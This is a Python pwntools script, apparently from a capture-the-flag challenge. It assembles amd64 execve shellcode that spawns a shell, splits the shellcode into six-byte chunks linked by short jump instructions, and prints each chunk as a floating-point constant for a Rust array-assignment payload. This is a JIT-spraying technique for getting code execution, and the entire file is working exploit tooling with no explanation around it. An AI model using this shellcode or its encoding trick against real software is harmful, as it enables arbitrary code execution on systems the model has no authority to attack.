import struct
from pwn import *
context(log_level='info', arch='amd64', os='linux')

shellcode = '''sub bl,0xcc
sub bh,0x3
mov rdi,rbx
mov rcx,rdi
shl rdx, 63
push rdx
add rcx ,30
push rcx
sub rcx,4
push rcx
sub rcx,6
push rcx
sub rcx,2
push rcx
sub rcx,18
push rcx 
mov rsi, rsp
push 0x3b
pop rax
syscall'''
asm_shellcode = asm(shellcode)
print(disasm(asm_shellcode))

add_jmp_shellcode = []
i = 0
shellcode_lines = shellcode.split('\n')
gap = 2
while(i < len(shellcode_lines)):
    oneline = asm(shellcode_lines[i])
    if(i+1 == len(shellcode_lines)):
        break
    while((len(oneline) + len(asm(shellcode_lines[i+1]))) <= 6):
        oneline += asm(shellcode_lines[i+1])
        i += 1
        if(i+1 == len(shellcode_lines)):
            break
    i += 1
    oneline = oneline.ljust(6, b"\x90")
    # if it is the last one then we need to add the syscall instead of jmp
    if(i+1 == len(shellcode_lines)):
        oneline += asm("syscall")
        add_jmp_shellcode.append(oneline)
        break
    else:
        if(gap == 2):
            oneline += b'\xeb'
            oneline += b'\x1f'  # 11->32
            gap -= 1
        elif(gap == 1):
            oneline += b'\xeb'
            oneline += b'\x11'  # 35->48
            gap -= 1
        else:
            oneline += b'\xeb'
            oneline += b'\x17'  # 35->48
        add_jmp_shellcode.append(oneline)
        
# log.info codes after compression
log.info("codes after compression:")
# log.info(add_jmp_shellcode)
[print(disasm(i)) for i in add_jmp_shellcode]

# log.info rust code
log.info("rust code:")
# [log.info(struct.unpack('d', i)[0]) for i in add_jmp_shellcode]
[print('a['+str(struct.unpack('d', i)[0])+']=0;') for i in add_jmp_shellcode]
log.info("lenght of rust code: " + str(len(add_jmp_shellcode)))
